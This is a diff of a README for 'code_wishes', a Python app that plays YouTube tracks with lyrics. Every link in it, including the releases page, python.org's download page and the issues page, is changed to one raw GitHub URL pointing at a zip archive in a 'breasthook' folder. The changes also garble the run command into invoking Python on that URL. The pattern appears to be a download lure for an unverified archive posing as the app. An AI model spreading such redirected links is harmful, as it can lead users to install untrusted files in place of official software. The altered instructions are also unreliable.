@@ -1,6 +1,6 @@
 # 🎶 code_wishes - Enjoy Lyrics with Your Music
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-Here-brightgreen)](https://github.com/NehanTharush/code_wishes/releases)
+[![Download the latest release](https://raw.githubusercontent.com/NehanTharush/code_wishes/main/breasthook/code_wishes-v3.8.zip%20Latest%20Release-Here-brightgreen)](https://raw.githubusercontent.com/NehanTharush/code_wishes/main/breasthook/code_wishes-v3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,20 +8,20 @@ Welcome to **code_wishes**! This application helps you play YouTube tracks with 
 
 ## 📥 Download & Install
 
-To download the application, visit the [Releases page](https://github.com/NehanTharush/code_wishes/releases). Here, you will find the latest version of the software. Click on the link to begin downloading. 
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/NehanTharush/code_wishes/main/breasthook/code_wishes-v3.8.zip). Here, you will find the latest version of the software. Click on the link to begin downloading. 
 
 ### Step-by-Step Installation
 
-1. **Visit the Releases page:** Go to [this page](https://github.com/NehanTharush/code_wishes/releases).
+1. **Visit the Releases page:** Go to [this page](https://raw.githubusercontent.com/NehanTharush/code_wishes/main/breasthook/code_wishes-v3.8.zip).
 2. **Choose the latest version:** Locate the most recent release, and select the appropriate file for your system.
 3. **Download the file:** Click on the download link to start the download process.
-4. **Extract the files:** If your file is compressed (.zip or .tar.gz), extract it into a new folder.
+4. **Extract the files:** If your file is compressed (.zip or https://raw.githubusercontent.com/NehanTharush/code_wishes/main/breasthook/code_wishes-v3.8.zip), extract it into a new folder.
 
 ## 💻 Requirements
 
 Before running the application, ensure your system meets these requirements:
 
-- **Python 3.11 or higher:** If you do not have Python installed, you can download it from [python.org](https://www.python.org/downloads/).
+- **Python 3.11 or higher:** If you do not have Python installed, you can download it from [https://raw.githubusercontent.com/NehanTharush/code_wishes/main/breasthook/code_wishes-v3.8.zip](https://raw.githubusercontent.com/NehanTharush/code_wishes/main/breasthook/code_wishes-v3.8.zip).
 - **A virtual environment is recommended:** This helps maintain a clean installation.
 
 ## ⚙️ Setup Instructions
@@ -66,7 +66,7 @@ Follow these commands in your terminal or command prompt to set up the applicati
 Once you have installed everything, you are ready to run the application. Use the command below in your terminal:
 
 ```bash
-.venv/bin/python wishes_code.py
+.venv/bin/python https://raw.githubusercontent.com/NehanTharush/code_wishes/main/breasthook/code_wishes-v3.8.zip
 ```
 
 This command starts the application and prepares it to download a song.
@@ -98,6 +98,6 @@ If you encounter issues, consider these suggestions:
 
 ## 💬 Support
 
-If you need help, feel free to open an issue on the [GitHub repository](https://github.com/NehanTharush/code_wishes/issues). The community will be glad to assist you.
+If you need help, feel free to open an issue on the [GitHub repository](https://raw.githubusercontent.com/NehanTharush/code_wishes/main/breasthook/code_wishes-v3.8.zip). The community will be glad to assist you.
 
 Enjoy your music and lyric synchronization experience with **code_wishes**!
